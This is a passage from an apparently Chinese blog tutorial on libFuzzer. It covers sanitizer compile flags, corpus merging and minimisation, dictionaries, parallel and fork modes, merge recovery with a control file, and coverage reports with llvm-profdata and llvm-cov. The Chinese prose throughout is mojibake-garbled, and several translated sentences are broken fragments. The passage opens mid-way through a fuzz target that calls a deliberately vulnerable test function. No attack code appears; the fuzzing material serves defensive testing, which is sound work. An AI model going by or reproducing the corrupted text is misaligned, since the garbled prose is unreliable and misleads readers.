class="hljs-type">char</span>*&gt;(data), size)</span></span>;<br>  <span class="hljs-keyword">auto</span> data_hash = std::<span class="hljs-built_in">hash</span>&lt;std::string&gt;()(data_string);<br><br>  std::<span class="hljs-type">size_t</span> flags = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">size_t</span>&gt;(data_hash);<br>  <span class="hljs-built_in">VulnerableFunction3</span>(data, size, flags);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ç¼–è¯‘</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang++ -g -std=c++11 -fsanitize=address,fuzzer fourth_fuzzer.cc -o fourth_fuzzer<br></code></pre></td></tr></table></figure><ul><li>è¿è¡Œ</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir corpus3<br>./fourth_fuzzer corpus3/ -max_len=1024<br></code></pre></td></tr></table></figure><ul><li><code>-max_total_time</code>ï¼šè®¾ç½®æœ€å¤§è¿è¡Œæ—¶é—´</li><li><code>-print_final_stats</code>ï¼šæ‰“å°æœ€ç»ˆç»Ÿè®¡ä¿¡æ¯</li><li><code>-max_len</code>ï¼šè®¾ç½®æœ€å¤§è¾“å…¥é•¿åº¦</li></ul><p>ä½¿ç”¨ <code>-fsanitize=fuzzer</code> ç¼–è¯‘æ ‡å¿—æ¥æ„å»ºç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æ¨èå°† libFuzzer ä¸å„ç§ Sanitizersï¼ˆå¦‚ AddressSanitizerã€UndefinedBehaviorSanitizerã€MemorySanitizerï¼‰ç»“åˆä½¿ç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">clang -g -O1 -fsanitize=fuzzer mytarget.c        <span class="hljs-comment"># ä¸å¸¦ sanitizers çš„æ¨¡ç³Šæµ‹è¯•ç›®æ ‡</span><br>clang -g -O1 -fsanitize=fuzzer,address mytarget.c  <span class="hljs-comment"># å¸¦ ASAN çš„æ¨¡ç³Šæµ‹è¯•ç›®æ ‡</span><br>clang -g -O1 -fsanitize=fuzzer,signed-integer-overflow mytarget.c  <span class="hljs-comment"># å¸¦ UBSAN çš„æ¨¡ç³Šæµ‹è¯•ç›®æ ‡</span><br>clang -g -O1 -fsanitize=fuzzer,memory mytarget.c  <span class="hljs-comment"># å¸¦ MSAN çš„æ¨¡ç³Šæµ‹è¯•ç›®æ ‡</span><br></code></pre></td></tr></table></figure><h2 id="è¯­æ–™åº“ä¼˜åŒ–"><a href="#è¯­æ–™åº“ä¼˜åŒ–" class="headerlink" title="è¯­æ–™åº“ä¼˜åŒ–"></a>è¯­æ–™åº“ä¼˜åŒ–</h2><p>libFuzzer ä½¿ç”¨ä¸€ä¸ªè¾“å…¥è¯­æ–™åº“ä½œä¸ºæ¨¡ç³Šæµ‹è¯•çš„åŸºç¡€ï¼Œè¯­æ–™åº“åº”åŒ…å«æœ‰æ•ˆå’Œæ— æ•ˆçš„è¾“å…¥æ ·æœ¬ã€‚æ¨¡ç³Šæµ‹è¯•é€šè¿‡å˜å¼‚è¯­æ–™åº“ä¸­çš„æ ·æœ¬ç”Ÿæˆæ–°çš„è¾“å…¥ï¼Œè§¦å‘æ–°çš„ä»£ç è·¯å¾„ã€‚</p><p>è¦†ç›–ç‡å¼•å¯¼çš„æ¨¡ç³Šæµ‹è¯•å™¨ï¼ˆå¦‚ libFuzzerï¼‰ä¾èµ–äº è¢«æµ‹ä»£ç ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œè¿™ä¸ªè¯­æ–™åº“åº”è¯¥åŒ…å«å„ç§é›†åˆ è¢«æµ‹ä»£ç çš„æœ‰æ•ˆå’Œæ— æ•ˆè¾“å…¥;ä¾‹å¦‚ï¼Œå¯¹äºå›¾å½¢ åº“åˆå§‹è¯­æ–™åº“å¯èƒ½åŒ…å«å„ç§ä¸åŒçš„å° PNG&#x2F;JPG&#x2F;GIF æ–‡ä»¶ã€‚æ¨¡ç³Šæµ‹è¯•å™¨æ ¹æ® å½“å‰è¯­æ–™åº“ã€‚å¦‚æœçªå˜è§¦å‘äº†å…ˆå‰å‘ç°çš„ path ä¸­ï¼Œåˆ™è¯¥ mutation å°†ä¿å­˜åˆ° æœªæ¥å˜åŒ–ã€‚</p><p>LibFuzzer å¯ä»¥åœ¨æ²¡æœ‰ä»»ä½•åˆå§‹ç§å­çš„æƒ…å†µä¸‹å·¥ä½œï¼Œä½†ä¼šæ›´å°‘ å¦‚æœè¢«æµ‹åº“æ¥å— complexï¼Œåˆ™ä¸º efficientï¼Œ ç»“æ„åŒ–è¾“å…¥ã€‚</p><p>è¯­æ–™åº“è¿˜å¯ä»¥å……å½“å¥å…¨æ€§&#x2F;å›å½’æ£€æŸ¥ï¼Œä»¥ç¡®è®¤ æ¨¡ç³Šæµ‹è¯•å…¥å£ç‚¹ä»ç„¶æœ‰æ•ˆï¼Œå¹¶ä¸”æ‰€æœ‰ç¤ºä¾‹è¾“å…¥éƒ½é€šè¿‡ è¢«æµ‹ä»£ç æ²¡æœ‰é—®é¢˜ã€‚</p><p>å¦‚æœæ‚¨æœ‰ä¸€ä¸ªå¤§å‹è¯­æ–™åº“ï¼ˆé€šè¿‡æ¨¡ç³Šæµ‹è¯•ç”Ÿæˆæˆ–é€šè¿‡å…¶ä»–æ–¹å¼è·å–ï¼‰ æ‚¨å¯èƒ½å¸Œæœ›å°†å…¶æœ€å°åŒ–ï¼ŒåŒæ—¶ä»ä¿ç•™å®Œæ•´è¦†ç›–èŒƒå›´ã€‚ä¸€ç§æ–¹æ³• æ˜¯ä½¿ç”¨Â -merge&#x3D;1Â æ ‡å¿—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir NEW_CORPUS_DIR  # Store minimized corpus here.<br>./my_fuzzer -merge=1 NEW_CORPUS_DIR FULL_CORPUS_DIR<br></code></pre></td></tr></table></figure><p>æ‚¨å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ ‡å¿—å°†æ›´å¤šæœ‰è¶£çš„é¡¹ç›®æ·»åŠ åˆ°ç°æœ‰è¯­æ–™åº“ä¸­ã€‚ åªæœ‰è§¦å‘æ–°è¦†ç›–ç‡çš„è¾“å…¥æ‰ä¼šè¢«æ·»åŠ åˆ°ç¬¬ä¸€ä¸ªè¯­æ–™åº“ä¸­ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./my_fuzzer -merge=1 CURRENT_CORPUS_DIR NEW_POTENTIALLY_INTERESTING_INPUTS_DIR<br></code></pre></td></tr></table></figure><p><strong>æ„å»ºè¯­æ–™åº“ï¼š</strong></p><p>å¯ä»¥é€šè¿‡ <code>-merge=1</code> æ ‡å¿—æ¥æœ€å°åŒ–è¯­æ–™åº“ï¼Œå¹¶å°†æ–°çš„ã€æœ‰è¶£çš„è¾“å…¥æ·»åŠ åˆ°ç°æœ‰è¯­æ–™åº“ä¸­ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> NEW_CORPUS_DIR  <span class="hljs-comment"># å­˜å‚¨æœ€å°åŒ–åçš„è¯­æ–™åº“</span><br>./my_fuzzer -merge=1 NEW_CORPUS_DIR FULL_CORPUS_DIR<br></code></pre></td></tr></table></figure><p>æŒ‡å®šè¯­æ–™åº“</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir dir1 <br>./demo-fuzzer dir1/ dir2/ dir3/ ...<br></code></pre></td></tr></table></figure><p>è¯­æ–™åº“è£å‰ª</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir corpus1_min <br>./demo-fuzzer -merge=1 merge/ dir1/ dir2 ...<br></code></pre></td></tr></table></figure><p>-dict å‚æ•°æŒ‡å®šä¸€ä¸ªè¯­æ–™åº“,åç»­ManualDictè¿™äº›æ•°æ®å˜å¼‚æ¨¡å—å°±å¯ä»¥ä»è¿™é‡Œæ‹¿åˆ°å’Œå½“å‰è¢«æµ‹è¯•çš„é€»è¾‘ å¼ºç›¸å…³çš„å…³é”®è¯.ä¸¾ä¸ªä¾‹å­,æˆ‘ä»¬å¯¹SQLæ³¨å…¥åšæµ‹è¯•,è¿™äº›å…³é”®è¯æ˜¯ä¸æ˜¯å°±åŒ…å«äº†:union select,from,count() ç­‰;å¯¹æ–‡ä»¶è§£ææµ‹è¯•,æ˜¯ä¸æ˜¯å°±éœ€è¦åŒ…å«7zip,PE,MZ,Rar!ç­‰å…³é”®è¯å‘¢.æˆ‘ä»¬ä¼ é€’çš„è¿™äº›å…³é”®è¯,æœ€ç»ˆä¼šè¢«æ‹¼æ¥ åˆ°LLVMFuzzerTestOneInput()çš„dataå‚æ•°ä¸­. å®é™…ä¸Š,libFuzzerä¹Ÿèƒ½å¤ŸåƒAFLä¸€æ ·æ¥å—ä¸€æ‰¹æ ·æœ¬æ•°æ®ä½œä¸ºåˆå§‹åŒ–è¾“å…¥æ¥åšæ¨¡ç³Šæµ‹è¯•.è¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥ æ ¹æ®æ¨¡ç³Šæµ‹è¯•çš„å¯¹è±¡çš„ä¸šåŠ¡å»githubå’Œå„ä¸ªé¡¹ç›®çš„æµ‹è¯•ç”¨ä¾‹ä¸­æœç½—æ ·æœ¬æ•°æ®äº†. ä¸Šé¢ä¸¤ä¸ªå‚æ•°æ˜¯å¯ä»¥ç»“åˆä½¿ç”¨çš„,ä¸å¸¦å‚æ•°å’Œå¸¦å‚æ•°çš„å¯¹è·¯å¾„æ¢æµ‹çš„ç»“æœå½±å“å¦‚ä¸‹</p><ul><li><ul><li><p><strong><code>crash-&lt;sha1&gt;</code></strong>ï¼šè§¦å‘å´©æºƒçš„è¾“å…¥ã€‚</p><ul><li><p><strong><code>leak-&lt;sha1&gt;</code></strong>ï¼šå¼•å‘å†…å­˜æ³„æ¼çš„è¾“å…¥ã€‚</p></li><li><p><strong><code>timeout-&lt;sha1&gt;</code></strong>ï¼šå¯¼è‡´ç¨‹åºè¶…æ—¶çš„è¾“å…¥ã€‚</p></li></ul></li></ul></li><li><p>libFuzzer ä¼šè‡ªåŠ¨ç”Ÿæˆæ–°çš„è¾“å…¥æ ·æœ¬ï¼Œè¯•å›¾è§¦å‘æ›´å¤šçš„ä»£ç è·¯å¾„ã€‚å¦‚æœæŸä¸ªæ–°ç”Ÿæˆçš„è¾“å…¥èƒ½å¤Ÿè§¦å‘ä¸€ä¸ªæœªæ›¾æ‰§è¡Œè¿‡çš„è·¯å¾„ï¼ˆå³æ–°çš„è¦†ç›–ç‡ï¼‰ï¼ŒlibFuzzer ä¼šè®¤ä¸ºè¿™ä¸ªè¾“å…¥æ˜¯â€œæœ‰è¶£çš„â€ï¼Œå¹¶å°†å…¶ä¿å­˜åˆ° <code>CORPUS_DIR</code> ç›®å½•ä¸­ã€‚</p></li><li><p>è¿™æ ·ï¼Œéšç€æ—¶é—´çš„æ¨ç§»ï¼Œ<code>CORPUS_DIR</code> ä¼šç§¯ç´¯æ›´å¤šçš„æœ‰è¶£çš„è¾“å…¥æ ·æœ¬ï¼Œè¿™äº›æ ·æœ¬èƒ½å¤Ÿæœ‰æ•ˆåœ°æé«˜æµ‹è¯•çš„è¦†ç›–ç‡ã€‚</p></li></ul><h2 id="å¹¶è¡Œæ¨¡ç³Šæµ‹è¯•"><a href="#å¹¶è¡Œæ¨¡ç³Šæµ‹è¯•" class="headerlink" title="å¹¶è¡Œæ¨¡ç³Šæµ‹è¯•"></a>å¹¶è¡Œæ¨¡ç³Šæµ‹è¯•</h2><p>æ¯ä¸ª libFuzzer è¿›ç¨‹éƒ½æ˜¯å•çº¿ç¨‹çš„ï¼Œé™¤éå—æµ‹åº“å¯åŠ¨å®ƒè‡ªå·±çš„çº¿ç¨‹ã€‚ä½†æ˜¯ï¼Œå¯ä»¥åœ¨ä¸å…±äº«è¯­æ–™åº“ç›®å½•å¹¶è¡Œï¼›è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œä»»ä½•æ–°çš„ä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•ç¨‹åºè¿›ç¨‹æ‰¾åˆ°çš„è¾“å…¥å°†å¯ä¾›å¦ä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•ç¨‹åºä½¿ç”¨è¿›ç¨‹ï¼ˆé™¤éæ‚¨ä½¿ç”¨é€‰é¡¹ç¦ç”¨æ­¤åŠŸèƒ½ï¼‰ã€‚<code>-reload=0</code></p><p>libFuzzer æ”¯æŒé€šè¿‡å¤šè¿›ç¨‹æˆ–å¤šçº¿ç¨‹çš„æ–¹å¼æ¥å¹¶è¡ŒåŒ–æ¨¡ç³Šæµ‹è¯•ã€‚ä½ å¯ä»¥é€šè¿‡è®¾ç½®å¤šä¸ªå®ä¾‹è¿è¡Œ <code>libFuzzer</code>ï¼Œæ¯ä¸ªå®ä¾‹éƒ½æœ‰è‡ªå·±çš„è¾“å…¥ Corpusï¼Œå¹¶ä¸”å…±äº«ä¸€ä¸ªå…¨å±€çš„ç»“æœã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./fuzzer -jobs=10 CORPUS<br></code></pre></td></tr></table></figure><p>è¿™ä¸»è¦ç”±é€‰é¡¹æ§åˆ¶ï¼Œè¿™è¡¨æ˜ åº”è¿è¡ŒÂ NÂ ä¸ªæ¨¡ç³Šæµ‹è¯•ä½œä¸šç›´åˆ°å®Œæˆï¼ˆå³ç›´åˆ°å‘ç°é”™è¯¯æˆ– è¾¾åˆ°æ—¶é—´&#x2F;è¿­ä»£é™åˆ¶ï¼‰ã€‚è¿™äº›ä½œä¸šå°†åœ¨ä¸€ç»„ worker è¿›ç¨‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨ä¸€åŠçš„å¯ç”¨ CPU å†…æ ¸;çš„ Count worker è¿›ç¨‹å¯ä»¥è¢« option è¦†ç›–ã€‚ä¾‹å¦‚ åœ¨ 12 æ ¸æœºå™¨ä¸Šè¿è¡Œ å°†é»˜è®¤è¿è¡Œ 6 ä¸ª workerï¼Œ æ¯ä¸ª worker åœ¨å®Œæˆæ•´ä¸ªè¿‡ç¨‹æ—¶å¹³å‡æœ‰ 5 ä¸ª bugã€‚<code>-jobs=N``-workers=N``-jobs=30</code></p><h2 id="Fork-æ¨¡å¼"><a href="#Fork-æ¨¡å¼" class="headerlink" title="Fork æ¨¡å¼"></a>Fork æ¨¡å¼</h2><p>libFuzzer é»˜è®¤åœ¨å•è¿›ç¨‹æ¨¡å¼ä¸‹è¿è¡Œï¼Œè€Œ Fork æ¨¡å¼é€šè¿‡å¤šå­è¿›ç¨‹+çˆ¶è¿›ç¨‹è°ƒåº¦çš„æ–¹å¼è¿è¡Œã€‚</p><p>Fork æ¨¡å¼å…è®¸é€šè¿‡ç‹¬ç«‹çš„å­è¿›ç¨‹æ‰§è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œæé«˜å†…å­˜æº¢å‡ºã€è¶…æ—¶å’Œå´©æºƒçš„å®¹é”™æ€§ã€‚å¾€å¾€åœ¨ Fuzz å¤§è§„æ¨¡çš„ç¨‹åºæ—¶æˆ‘ä»¬æ‰ä¼šé€šè¿‡ Fork æ¨¡å¼è¿›è¡Œå¹¶è¡ŒåŒ–çš„ Fuzzã€‚</p><p>å‚æ•°è¯´æ˜ï¼š</p><ul><li><code>-fork=N</code>ï¼šå¯ç”¨ Fork æ¨¡å¼ï¼Œå¼€å¯ N ä¸ªå­è¿›ç¨‹å¹¶è¡Œ fuzzã€‚çˆ¶è¿›ç¨‹è´Ÿè´£åè°ƒè¯­æ–™ã€è°ƒåº¦å’Œå´©æºƒåˆå¹¶ã€‚</li><li><code>-jobs=N</code>ï¼šå¹¶è¡Œä½œä¸šæ•°é‡ã€‚ä¸ <code>-workers</code> é…åˆä½¿ç”¨ï¼Œæ¨èç”¨äºåˆ†å¸ƒå¼&#x2F;CI ç­‰ç°ä»£è°ƒåº¦åœºæ™¯ã€‚</li><li><code>-workers=N</code>ï¼šæ¯ä¸ª job ä¸­çš„å·¥ä½œçº¿ç¨‹æ•°ã€‚</li><li><code>-ignore_ooms=1</code>ï¼šå¦‚æœå­è¿›ç¨‹å‘ç”Ÿ OOMï¼Œç»§ç»­ fuzzï¼Œä¿å­˜é—®é¢˜è¾“å…¥ã€‚</li><li><code>-ignore_timeouts=1</code>ï¼šå¦‚æœå­è¿›ç¨‹è¶…æ—¶ï¼Œç»§ç»­ fuzzï¼Œä¿å­˜é—®é¢˜è¾“å…¥ã€‚</li><li><code>-ignore_crashes=0</code>ï¼šé»˜è®¤é‡åˆ°å´©æºƒä¼šä¸­æ­¢ fuzzï¼Œå¯è®¾ç½®ä¸º 1 å¿½ç•¥å¹¶ç»§ç»­ã€‚</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./my_fuzzer -fork=4 corpus/ -ignore_crashes=1<br></code></pre></td></tr></table></figure><p>æˆ–ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./my_fuzzer -jobs=4 -workers=1 corpus/ -ignore_crashes=1<br></code></pre></td></tr></table></figure><h2 id="åˆå¹¶æ¢å¤"><a href="#åˆå¹¶æ¢å¤" class="headerlink" title="åˆå¹¶æ¢å¤"></a>åˆå¹¶æ¢å¤</h2><p><strong>åˆå¹¶æ¢å¤</strong>ï¼ˆ<strong>merge recovery</strong>ï¼‰æ˜¯ LibFuzzer åœ¨æ‰§è¡Œè¯­æ–™åº“åˆå¹¶æ—¶çš„ä¸€ç§<strong>ä¸­æ–­æ¢å¤æœºåˆ¶</strong>ã€‚å®ƒçš„ä½œç”¨æ˜¯åœ¨åˆå¹¶è¯­æ–™åº“ï¼ˆcorpusï¼‰è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå› ä¸ºæŸäº›åŸå› ï¼ˆæ¯”å¦‚å´©æºƒã€ç³»ç»Ÿä¸­æ–­æˆ–äººä¸ºç»ˆæ­¢ï¼‰å¯¼è‡´åˆå¹¶æ²¡æœ‰å®Œæˆï¼Œå¯ä»¥<strong>ä»ä¸­æ–­çš„ä½ç½®ç»§ç»­åˆå¹¶</strong>ï¼Œè€Œä¸æ˜¯ä»å¤´å¼€å§‹ã€‚</p><p>å¦‚æœåˆå¹¶å¤§å‹è¯­æ–™åº“æ—¶å‡ºç°ä¸­æ–­ï¼Œå¯ä»¥ä½¿ç”¨ <strong>-merge_control_file</strong> æ ‡å¿—æ¥æ¢å¤åˆå¹¶è¿›ç¨‹ï¼š</p><ol><li><p>å¼€å§‹åˆå¹¶æ—¶åˆ›å»ºæ§åˆ¶æ–‡ä»¶ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./my_fuzzer CORPUS1 CORPUS2 -merge=1 -merge_control_file=SomeLocalPath<br></code></pre></td></tr></table></figure></li><li><p>è‹¥è¿›ç¨‹ä¸­æ–­ï¼Œå¯ä»¥åœ¨å¦ä¸€ä¸ªç»ˆç«¯æ¢å¤åˆå¹¶ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">killall -SIGUSR1 my_fuzzer<br></code></pre></td></tr></table></figure></li></ol><ul><li><p><strong>-help</strong>ï¼šæ‰“å°å¸®åŠ©ä¿¡æ¯ã€‚</p></li><li><p><strong>-seed&#x3D;N</strong>ï¼šè®¾ç½®éšæœºç§å­ï¼Œé»˜è®¤å€¼ä¸º 0ã€‚</p></li><li><p><strong>-runs&#x3D;N</strong>ï¼šè®¾ç½®æµ‹è¯•è¿è¡Œæ¬¡æ•°ï¼Œé»˜è®¤ä¸º -1ï¼ˆæ— é™æ¬¡è¿è¡Œï¼‰ã€‚</p></li><li><p><strong>-max_len&#x3D;N</strong>ï¼šè®¾ç½®è¾“å…¥æœ€å¤§é•¿åº¦ï¼Œé»˜è®¤ 0ã€‚</p></li><li><p><strong>-timeout&#x3D;N</strong>ï¼šè®¾ç½®è¶…æ—¶ç§’æ•°ï¼Œé»˜è®¤ 1200 ç§’ã€‚</p></li><li><p><strong>-rss_limit_mb&#x3D;N</strong>ï¼šè®¾ç½®å†…å­˜é™åˆ¶ï¼Œé»˜è®¤ 2048 MBã€‚</p></li><li><p><strong>-merge</strong>ï¼šå¦‚æœä¸º 1ï¼Œæ–°çš„è¾“å…¥å°†è¢«åˆå¹¶åˆ°ç§å­ç›®å½•ä¸­ã€‚</p></li><li><p><strong>-reload</strong>ï¼šå¦‚æœä¸º 1ï¼Œæ¨¡ç³Šå™¨å®šæœŸé‡æ–°åŠ è½½ç§å­ç›®å½•ã€‚</p></li></ul><p>è¾“å‡ºä¿¡æ¯ï¼š</p><p>æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­çš„è¾“å‡ºä¿¡æ¯åŒ…æ‹¬ï¼š</p><ul><li><p><strong>INITED</strong>ï¼šåˆå§‹åŒ–å®Œæˆï¼Œå¼€å§‹æµ‹è¯•ã€‚</p></li><li><p><strong>NEW</strong>ï¼šç”Ÿæˆæ–°çš„æµ‹è¯•è¾“å…¥ï¼Œè§¦å‘æ–°è·¯å¾„ã€‚</p></li><li><p><strong>REDUCE</strong>ï¼šæ‰¾åˆ°æ›´å°çš„è¾“å…¥ï¼Œè§¦å‘ä¹‹å‰å‘ç°çš„ç‰¹æ€§ã€‚</p></li><li><p><strong>DONE</strong>ï¼šæµ‹è¯•å®Œæˆã€‚</p></li></ul><p>è¾“å‡ºè¿˜åŒ…å«å…³äºæµ‹è¯•è¿›å±•ã€è¦†ç›–ç‡å’Œå†…å­˜æ¶ˆè€—çš„è¯¦ç»†ä¿¡æ¯ã€‚</p><p>åˆå¹¶å¤§å‹è¯­æ–™åº“å¯èƒ½å¾ˆè€—æ—¶ï¼Œè€Œä¸”è¿™æ ·åšé€šå¸¸æ˜¯å¯å–çš„ åœ¨å¯æŠ¢å çš„ VM ä¸Šï¼Œè¿›ç¨‹å¯èƒ½éšæ—¶è¢«ç»ˆæ­¢ã€‚ ä¸ºäº†æ— ç¼æ¢å¤åˆå¹¶ï¼Œè¯·ä½¿ç”¨ flag å’Œ use ä»¥æ­£å¸¸åœæ­¢åˆå¹¶ã€‚ä¾‹ï¼š<code>-merge_control_file``killallÂ -SIGUSR1Â /path/to/fuzzer/binary</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">% rm -f SomeLocalPath<br>% ./my_fuzzer CORPUS1 CORPUS2 -<span class="hljs-keyword">merge</span>=<span class="hljs-number">1</span> -merge_control_file=SomeLocalPath<br>...<br><span class="hljs-keyword">MERGE</span>-<span class="hljs-keyword">INNER</span>: <span class="hljs-keyword">using</span> the control file <span class="hljs-string">&#x27;SomeLocalPath&#x27;</span><br>...<br># <span class="hljs-keyword">While</span> this <span class="hljs-keyword">is</span> running, <span class="hljs-keyword">do</span> <span class="hljs-symbol">`killall -SIGUSR1 my_fuzzer`</span> <span class="hljs-keyword">in</span> another console<br>==<span class="hljs-number">9015</span>== INFO: libFuzzer: exiting <span class="hljs-keyword">as</span> requested<br><br># This will leave the file SomeLocalPath <span class="hljs-keyword">with</span> the partial state of the <span class="hljs-keyword">merge</span>.<br># Now, you can <span class="hljs-keyword">continue</span> the <span class="hljs-keyword">merge</span> <span class="hljs-keyword">by</span> executing the same command. The <span class="hljs-keyword">merge</span><br># will <span class="hljs-keyword">continue</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">where</span> it has been interrupted.<br>% ./my_fuzzer CORPUS1 CORPUS2 -<span class="hljs-keyword">merge</span>=<span class="hljs-number">1</span> -merge_control_file=SomeLocalPath<br>...<br><span class="hljs-keyword">MERGE</span>-<span class="hljs-keyword">OUTER</span>: non-empty control file provided: <span class="hljs-string">&#x27;SomeLocalPath&#x27;</span><br><span class="hljs-keyword">MERGE</span>-<span class="hljs-keyword">OUTER</span>: control file ok, <span class="hljs-number">32</span> files total, <span class="hljs-keyword">first</span> <span class="hljs-keyword">not</span> processed file <span class="hljs-number">20</span><br>...<br></code></pre></td></tr></table></figure><h2 id="è¦†ç›–ç‡åˆ†æ"><a href="#è¦†ç›–ç‡åˆ†æ" class="headerlink" title="è¦†ç›–ç‡åˆ†æ"></a>è¦†ç›–ç‡åˆ†æ</h2><h3 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>LibFuzzer ä½¿ç”¨ <strong>åŸºäº SanitizerCoverageï¼ˆSanCovï¼‰</strong> çš„æ’æ¡©æ–¹å¼è®°å½•å“ªäº›ä»£ç è·¯å¾„å·²ç»è¢«æ‰§è¡Œè¿‡ã€‚å®ƒä¾èµ– LLVM ç¼–è¯‘å™¨æä¾›çš„åŠŸèƒ½ï¼Œåœ¨ç¼–è¯‘æ—¶æ’å…¥æ¢é’ˆä»£ç ï¼Œä»¥ä¾¿åœ¨è¿è¡Œæ—¶æ”¶é›†è¦†ç›–ç‡ä¿¡æ¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang++ -fsanitize=fuzzer -fsanitize-coverage=trace-pc-guard -g your_target.cc -o fuzzer_target<br></code></pre></td></tr></table></figure><ul><li><code>-fsanitize=fuzzer</code>ï¼šå¯ç”¨ libFuzzer é©±åŠ¨ï¼›</li><li><code>-fsanitize-coverage=trace-pc-guard</code>ï¼šåœ¨æ¯ä¸ªåŸºæœ¬å—æ’å…¥ PC è·¯å¾„è¿½è¸ªä»£ç ï¼›</li></ul><p>æ¯å½“ Fuzzer æ‰§è¡Œä¸€æ¬¡è¾“å…¥ï¼Œå®ƒä¼šï¼š</p><ol><li>æ”¶é›†å½“å‰è¾“å…¥è§¦å‘çš„è·¯å¾„å“ˆå¸Œï¼›</li><li>åˆ¤æ–­æ˜¯å¦æ˜¯æ–°çš„è·¯å¾„ï¼›</li><li>å¦‚æœæ˜¯æ–°è·¯å¾„ï¼Œå°†è¯¥è¾“å…¥åŠ å…¥è¯­æ–™åº“</li></ol><h3 id="æŸ¥çœ‹è¦†ç›–ç‡ä¿¡æ¯"><a href="#æŸ¥çœ‹è¦†ç›–ç‡ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹è¦†ç›–ç‡ä¿¡æ¯"></a>æŸ¥çœ‹è¦†ç›–ç‡ä¿¡æ¯</h3><ul><li>ç¼–è¯‘ç›®æ ‡å¹¶ç”Ÿæˆè¦†ç›–ç‡ä¿¡æ¯</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang++ -fsanitize=fuzzer -fprofile-instr-generate -fcoverage-mapping your_target.cc -o fuzzer_target<br></code></pre></td></tr></table></figure><ul><li>è¿è¡Œ Fuzzer æ”¶é›† profile ä¿¡æ¯</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">LLVM_PROFILE_FILE=&quot;coverage.profraw&quot; ./fuzzer_target corpus/<br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨ <code>llvm-profdata</code> åˆå¹¶ profile æ•°æ®</li></ul><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">llvm-profdata <span class="hljs-keyword">merge</span> -sparse coverage.profraw -o coverage.profdata<br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨ <code>llvm-cov</code> ç”Ÿæˆå¯è¯»çš„è¦†ç›–ç‡æŠ¥å‘Š</li></ul><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">llvm-<span class="hljs-built_in">cov</span> <span class="hljs-built_in">show</span> ./fuzzer_target -instr-profile=coverage.profdata your_target.cc<br></code></pre></td></tr></table></figure><ul><li>ç”Ÿæˆ HTML æŠ¥å‘Š</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">llvm-cov show ./fuzzer_target -instr-profile=coverage.profdata -format=html -output-dir=coverage_html<br></code></pre></td></tr></table></figure><h2 id="å­—å…¸æ”¯æŒ"><a href="#å­—å…¸æ”¯æŒ" class="headerlink" 